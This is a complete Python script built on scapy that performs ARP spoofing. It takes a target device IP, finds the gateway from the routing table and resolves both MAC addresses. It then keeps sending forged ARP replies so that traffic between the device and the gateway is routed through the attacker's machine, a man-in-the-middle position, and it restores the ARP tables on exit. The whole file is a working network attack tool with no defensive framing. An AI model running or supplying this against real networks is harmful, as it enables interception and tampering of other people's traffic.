import scapy.all as scapy
import time
import subprocess
import re
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-d", "--device", dest="device_ip", help="Device IP")
    (options, arguments) = parser.parse_args()
    if not options.device_ip:
        parser.error("[-] Specify an Device IP, use --help for more info")
    return options


def get_gateway_ip():
    ip = re.findall(r"\d+.\d+.\d+.\d+", subprocess.check_output(["route", "-n"]).decode())[1]
    return ip


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, verbose=False, timeout=1)[0]
    while not answered_list:
        answered_list = scapy.srp(arp_request_broadcast, verbose=False, timeout=1)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, target_mac, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip, dest_mac, src_mac):
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
device_ip = options.device_ip
device_mac = get_mac(device_ip)
if device_mac:
    print(f"[+] Got device mac: {device_mac}")
gateway_ip = get_gateway_ip()
if gateway_ip:
    print(f"[+] Got gateway ip: {gateway_ip}")
gateway_mac = get_mac(gateway_ip)
if gateway_mac:
    print(f"[+] Got gateway mac: {gateway_mac}")

try:
    sent_packets_count = 0
    while True:
        spoof(device_ip, device_mac, gateway_ip)
        spoof(gateway_ip, gateway_mac, device_ip)
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C.......Resetting ARP tables.")
    restore(device_ip, gateway_ip, device_mac, gateway_mac)
    restore(gateway_ip, device_ip, gateway_mac, device_mac)
